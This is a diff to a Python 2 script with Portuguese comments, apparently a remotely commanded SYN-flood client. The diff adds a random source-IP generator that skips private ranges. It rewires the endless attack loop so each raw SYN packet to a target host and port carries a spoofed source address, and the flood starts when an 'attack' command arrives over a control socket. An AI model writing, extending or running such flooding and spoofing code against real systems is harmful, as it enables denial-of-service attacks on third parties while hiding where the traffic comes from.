@@ -9,10 +9,22 @@ import argparse
 import thread
 from struct import *
 from random import randint
+from random import randrange
 from multiprocessing import Process
 
 # TODO: Remover prints na tela
 # TODO: Remover imports desnecessários
+
+def get_random_ip():
+    not_valid = [10,127,169,172,192]
+
+    first = randrange(1,256)
+    while first in not_valid:
+        first = randrange(1,256)
+
+    ip = ".".join([str(first),str(randrange(1,256)),
+    str(randrange(1,256)),str(randrange(1,256))])
+    return ip
 
 # Funcoes auxiliares para calculo do checksum
 
@@ -172,9 +184,8 @@ def receivemessage(socket):
 def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
     print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
     # TODO: Implementar opcao de ataque de acordo com attack_type
-    # TODO: spoof IP local
     while(1):
-        packet = montaPacote(0,local_ip, dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
+        packet = montaPacote(0,get_random_ip(), dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
         raw_socket.sendto(packet,(dest_ip,0))
         sleep(1)
         print "sending attack"
@@ -182,6 +193,7 @@ def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
 
 #comando para ver processos: ps -eo pid,ppid,stat,cmd
 #comando mais simples: top
+# TODO: testar ataque com processo zombie
 #pid = fork()
 pid = 1
 if pid == 0:
@@ -229,9 +241,9 @@ else:
             if data2.startswith("attack"):
                 dest_ip = data2.split()[1]
                 dest_port = data2.split()[2]
-                # Flood mode
+                # Novo processo para ataque
                 try:
-                    proc = Process(target=attack,args=(raw_s,"SYN",local_ip,dest_ip,dest_port))
+                    proc = Process(target=attack,args=(raw_s,"SYN",get_random_ip(),dest_ip,dest_port))
                     proc.start()
                     signal = receivemessage(s)
                     if signal.rstrip() == "stop":
@@ -251,7 +263,7 @@ else:
         s.send("die")
         exit()
     except KeyboardInterrupt:
-        # Fim do programa
-        #print "Disconnecting..."
+    # Fim do programa forçado
+        print "Disconnecting..."
         s.send("die")
         exit()
